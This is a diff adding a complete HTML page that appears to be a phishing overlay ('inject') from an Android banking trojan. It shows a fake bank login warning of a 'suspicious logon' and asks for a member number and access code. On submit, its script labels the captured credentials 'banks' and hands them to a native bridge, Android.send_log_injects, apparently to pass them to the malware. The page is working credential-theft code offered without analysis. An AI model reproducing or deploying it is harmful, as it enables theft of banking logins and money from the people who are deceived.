@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+    <script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.4/angular.min.js"></script>
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.0/css/bootstrap.min.css">
+    <style>
+        header {
+            text-align: center;
+            padding: 25px;
+        }
+
+        section {
+            padding: 15px;
+        }
+
+        footer {
+            width: 230px;
+            margin:  0 auto;
+        }
+
+        .input {
+            width: 100%;
+            padding: 15px;
+            border: 0;
+            border-bottom: 2px solid #e6e6e6;
+            margin-bottom: 15px;
+            font-weight: 300;
+        }
+
+        .button {
+            width: 100%;
+            font-size: 22px;
+            font-weight: 600;
+            color: #000;
+            padding: 8px;
+            border: 0;
+            border-radius: 2px;
+            background-color: #91bcc8;
+        }
+
+        .button:disabled {
+            background: rgb(233,233,233);
+            background: linear-gradient(180deg, rgba(233,233,233,1) 0%, rgba(212,212,212,1) 100%);
+        }
+
+        input, button {
+            outline: none !important;
+            box-shadow: none !important;
+        }
+    </style>
+</head>
+<body>
+    <form onsubmit="return false">
+        <header>
+            <img style="width: 30px;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEkAAABJCAMAAABGrfvuAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyVpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDYuMC1jMDA2IDc5LjE2NDY0OCwgMjAyMS8wMS8xMi0xNTo1MjoyOSAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIDIyLjIgKE1hY2ludG9zaCkiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6MDIyQjhGNjk4RTRDMTFFQjg5QTNFMUJGNUE0ODRBMkEiIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6MDIyQjhGNkE4RTRDMTFFQjg5QTNFMUJGNUE0ODRBMkEiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDowMjJCOEY2NzhFNEMxMUVCODlBM0UxQkY1QTQ4NEEyQSIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDowMjJCOEY2ODhFNEMxMUVCODlBM0UxQkY1QTQ4NEEyQSIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/Pv+b4XUAAAK4UExURQGgrgGg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" alt="">
+            <p style="margin-top: 30px;font-size: 22px;font-weight: 600;color: #16a5b3;"> Log in </p>
+        </header>
+        <section>
+            <p style="color: #333;"> Suspicious logon detected. Fill in the required fields so we can verify your identity. </p>
+
+            <input type="text" class="input" id="login" name="login" placeholder="Enter member number" autocomplete="off"> 
+            <input type="password" class="input" id="password" name="password" placeholder="Enter access code" autocomplete="off"> 
+        </section>
+        <footer>
+            <input type="submit" class="button" id="sendData" disabled value="Log in">
+        </footer>
+    </form>
+
+    <script>
+        var login = document.getElementById('login'),
+            password = document.getElementById('password');
+
+        var sendData = document.getElementById('sendData');
+
+        function check() {
+            if(login.value.length >= 6 && password.value.length >= 6) {
+                sendData.disabled = false;
+            } else {
+                sendData.disabled = true;
+            }
+        }
+
+        login.onkeyup = () => {
+            check();
+        }
+
+        password.onkeyup = () => {
+            check();
+        }
+
+        sendData.onclick = () => {
+                var data = {};
+                data.login = login.value;
+                data.password = password.value;
+                data.type_injects = "banks";
+                data.closed = "close_activity_injects";
+
+                var ua = navigator.userAgent.toLowerCase();
+                if(ua.indexOf("android") > -1) {
+                    try {
+                        Android.send_log_injects(JSON.stringify(data))
+                    } catch (err) {}
+                }else{
+                    alert(JSON.stringify(data));
+                }
+        }
+    </script>
+</body>
+</html>
